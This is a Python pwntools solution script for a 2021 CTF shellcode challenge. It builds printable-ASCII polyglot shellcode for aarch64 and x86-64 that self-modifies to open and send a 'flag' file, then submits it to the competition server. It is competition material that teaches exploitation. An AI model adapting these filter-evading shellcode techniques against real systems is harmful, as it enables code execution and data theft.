#!/usr/bin/env python3
# the x86-64 part is done by @how2hack

from pwn import *

def check(payload):
    assert isinstance(payload, bytes) or isinstance(payload, bytearray)
    for c in payload:
        if not (0x20 <= c <= 0x7f):
            return False
    return True

s_aarch64 = asm('''
.inst 0x32207a7d /* orr w29, w11, #0x3fff */

/* prepare */
adds w11, w26, #2271
subs w11, w11, #2056 /* w11 = 0b00_0011_0101_11 = 215 */
adds w11, w11, #2073 /* w11 = 0b10_0011_1100_00 = 2288 */
adds w17, w26, #2460
adds w18, w26, #2508
adds w10, w26, #3036

/* prepare x1 = "flag" */
subs w25, w11, #2131 /* w25 = 0x9d */
subs w9, w10, #2064 /* w9 = 0x03cc */
strh w9, [x1, x25]
subs w25, w11, #2129 /* w25 = 0x9f */
subs w9, w18, #2331 /* w9 = 0xb1 */
strb w9, [x1, x25]

/* prepare x0 = -100 */
subs w25, w11, #2128 /* w25 = 0xa0 */
subs w9, w17, #2332 /* w9 = 0x80 */
strb w9, [x1, x25]
subs w25, w11, #2127 /* w25 = 0xa1 */
subs w9, w10, #2640 /* w9 = 0x018c */
strh w9, [x1, x25]
subs w25, w11, #2125 /* w25 = 0xa3 */
subs w9, w18, #2267 /* w9 = 0xf1 */
strb w9, [x1, x25]

/* prepare svc #257: store 0x00 to 0xa6 and 0xba */
subs w25, w11, #2122 /* w25 = 0xa6 */
strb w26, [x1, x25]
subs w25, w18, #2322 /* w25 = 0xba */
strb w26, [x1, x25]

/* prepare svc #257: store 0xd4 to 0xa7 and 0xbb */
subs w9, w17, #2248 /* w9 = 0xd4 */
subs w25, w11, #2121 /* w25 = 0xa7 */
strb w9, [x1, x25]
subs w25, w18, #2321 /* w25 = 0xbb */
strb w9, [x1, x25]

.inst 0x32203d7d /* orr w29, w11, #0x3fff */
.inst 0x3220307d /* orr w29, w11, #0x3fff */
cbnz w26, 0x40404 /* branch instruction for i-cache flushing */

/* store "\x00" to 0xf7 to end the string "flag" */
subs w25, w18, #2261 /* w25 = 0xf7 */
strb w26, [x1, x25]

/* openat(-100, data_offset, 0, 0) */
subs w2, w17, #2460 /* w2 = 0x0 */
subs w3, w17, #2460 /* w3 = 0x0 */
subs w8, w18, #2452 /* w8 = 0x38 */
.inst 0x41414121 /* (b103cc21) adds x1, x1, #0xf3 */ /* x1 = "flag" */
.inst 0x41414141 /* (f1018c80) subs x0, x4, #0x63 */ /* x0 = -100 */
.inst 0x41413021 /* svc #257 */

/* sendfile(1, 3, 0, 0xf7) */
subs w0, w17, #2459 /* w0 = 0x1 */
subs w1, w17, #2457 /* w1 = 0x3 */
subs w3, w18, #2261 /* w3 = 0xf7 */
subs w8, w17, #2389 /* w8 = 0x47 */
.inst 0x41413021 /* svc #257 */
''', arch='aarch64')

# x86-64 assembly by @how2hack
s_x86_64 = asm('''
    push   0x33
    push   rsp
    pop    rcx
    imul   di, WORD PTR [rcx], 0x6d57
    push   rdi
    pop    rcx
    pop    rax
    sub    al, 0x77
    push   rax
    pop    rbx
    xor    al, 0x3c
    xor    BYTE PTR [rbx+rsi*1+0x40],cl
    xor    BYTE PTR [rbx+rsi*1+0x43],ch
    xor    BYTE PTR [rbx+rsi*1+0x47],ch
    xor    BYTE PTR [rbx+rsi*1+0x48],cl
    xor    BYTE PTR [rbx+rsi*1+0x49],cl
    xor    BYTE PTR [rbx+rsi*1+0x44],al
    xor    BYTE PTR [rbx+rsi*1+0x46],al
    xor    BYTE PTR [rbx+rsi*1+0x4d],cl
    xor    BYTE PTR [rbx+rsi*1+0x56],cl
    push   0x67616c66
    xor    BYTE PTR [rbx+rsi*1+0x57],cl
    push   0x57
    pop    rax
    rex.W
    rex.B
    xor    DWORD PTR [esi+0x51], esi
    pop    rdx
    push   rax

    push   rax
    pop    rsi
    push   0x54
    pop    rdi
    push   0x54
    pop    r10
    push   0x28
    pop    rax
    pop    rdx
    push   rax
''', arch='amd64')

s = (s_aarch64 + s_x86_64).ljust(280, b'A')

print('payload:', repr(s))
print('contains only alphanumeric:', check(s))

r = remote('shellcode.2021.ctfcompetition.com', 1337)
print(r.sendlineafter('Payload:\n', s).decode())
r.interactive()
# CTF{abc_easy_as_svc}
